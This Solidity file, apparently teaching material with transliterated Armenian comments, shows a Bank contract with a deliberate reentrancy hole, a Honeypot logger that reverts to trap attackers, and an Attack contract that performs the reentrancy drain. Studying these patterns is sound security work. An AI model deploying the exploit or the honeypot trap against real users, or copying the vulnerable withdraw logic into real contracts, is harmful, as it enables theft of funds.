//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ILogger {
    event Log(address caller, uint amount, uint actionCode);

    function log(address _caller, uint _amount, uint _actionCode) external;
}

//prosto jurnal sobitiyan a gcum
contract Logger is ILogger {
    function log(address _caller, uint _amount, uint _actionCode) public {
        emit Log(_caller, _amount, _actionCode);
    }
}

//taqun contract vor veracel enq honeypodi,
contract Honeypot is ILogger {
    function log(address, uint, uint _actionCode) public pure {
        if(_actionCode == 2) {
            revert("honeypot!");
        }
    }
}

contract Bank {//bank contracta vori vra kareli a dnel mek ic avel 
    mapping(address => uint) public balances;
    ILogger public logger;
    bool resuming; //mtcnum enq sheghogh anunov funkcia

    constructor(ILogger _logger) {//stegh khabum taqun contracti hascen a construct anum vori meji log funkcina aogtagorcum ayl voch protokol anogh logy
        logger = _logger;
    }

    function deposit() public payable {//depositi func
        require(msg.value >= 1 ether);

        balances[msg.sender] += msg.value; //

        logger.log(msg.sender, msg.value, 0);
    }
//mekhanizm mtcvac popokhakanov vor bacarum areentrancyn
    function withdraw() public {
        if(resuming == true) {
            _withdraw(msg.sender, 2);
        } else {
            resuming = true;
            _withdraw(msg.sender, 1);
        }
    }

//nerqin ogtagorcvogh verevini het
    function _withdraw(address _initiator, uint _statusCode) internal {
        (bool success, ) = msg.sender.call{value: balances[_initiator]}("");

        require(success, "Failed to send Ether");

        balances[_initiator] = 0;

        logger.log(msg.sender, msg.value, _statusCode);

        resuming = false; //honeypody mas
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

//reentrancy attack
contract Attack {
    uint constant PAY_AMOUNT = 1 ether;

    Bank bank; //popoxakan

    constructor(Bank _bank) {
        bank = Bank(_bank); //banki hascen
    }

    function attack() public payable {
        require(msg.value == PAY_AMOUNT);
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
//reentrancy 
    receive() external payable {
        if(bank.getBalance() >= PAY_AMOUNT) {
            bank.withdraw();
        }
    }
}
